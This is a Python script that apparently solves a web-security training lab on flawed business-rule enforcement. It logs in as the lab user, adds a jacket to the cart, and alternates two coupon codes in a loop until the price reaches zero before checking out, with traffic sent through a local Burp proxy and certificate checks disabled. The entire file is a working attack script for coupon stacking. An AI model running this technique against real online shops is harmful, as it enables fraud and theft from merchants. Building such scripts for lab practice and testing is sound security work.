# Problem -> Flawed enforcement of business rules

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Defining burp suite proxy
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Function to get csrf token 
def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

def jacket_buy(s,url):
    # code of login
    login_url = url + '/login'
    csrf_token = get_csrf(s,login_url)
    login_data = {
        'csrf':csrf_token,
        'username':'wiener',
        'password':'peter'
    }
    # Trying to log in
    res = s.post(login_url,data=login_data,verify=False,proxies=proxies)
    
    if 'Log out' in res.text:
        print('[+] Successfully LoggedIn as wiener')

        #Adding leather jacket into cart
        cart_url = url + '/cart'
        cart_data = {
            'productId':1,
            'redir':'PRODUCT',
            'quantity':1
        }
        s.post(cart_url,data =cart_data,verify=False,proxies=proxies)

        #Applying coupan untill cost become $0
        for i in range(1,10):
            coupon_url = cart_url + '/coupon'
            cart_csrf = get_csrf(s,cart_url)
            if i%2 != 0:
                coupan_data = {
                    'csrf':cart_csrf,
                    'coupon':'NEWCUST5'
                }
                s.post(coupon_url,data=coupan_data,verify=False,proxies=proxies)
            else:
                coupan_data = {
                    'csrf':cart_csrf,
                    'coupon':'SIGNUP30'
                    }
                s.post(coupon_url,data=coupan_data,verify=False,proxies=proxies) 

        # Buying jacket
        buy_url = cart_url + '/checkout'
        csrf = cart_csrf
        buy_data = {
            'csrf':csrf
        }
        res = s.post(buy_url,data=buy_data,verify=False,proxies=proxies)
        
        if 'Congratulations' in res.text:
            print("Successfully exploit Vulnerability")
        else:
            print("Unable to Solve lab")


    else:
        print('[-] Unable to login ')
# main function 
def main():
    if len(sys.argv) != 2:
        print("[+] Usage python3 {} <target-url>".format(sys.argv[0]))

    else:
        s = requests.Session()
        url = sys.argv[1]
        jacket_buy(s,url)

if __name__ == '__main__':
    main()



